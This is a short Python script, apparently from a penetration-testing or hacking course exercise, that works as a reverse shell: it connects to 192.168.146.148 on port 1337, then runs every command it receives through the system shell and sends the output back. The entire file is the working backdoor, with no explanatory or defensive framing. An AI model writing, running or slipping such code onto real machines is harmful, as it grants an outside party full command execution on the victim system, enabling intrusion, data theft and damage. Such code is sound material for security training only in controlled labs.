#!/user/bin/env python
import socket
import subprocess


def execute_system_command(command):
	return subprocess.check_output(command, shell=True).decode()


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.146.148", 1337))

data = connection.send("\n[+] connection established!\n".encode("utf-8"))

while True:
	command = connection.recv(1024)
	command_data = execute_system_command(command.decode("utf-8"))
	connection.send(command_data.encode("utf-8"))

connection.close()
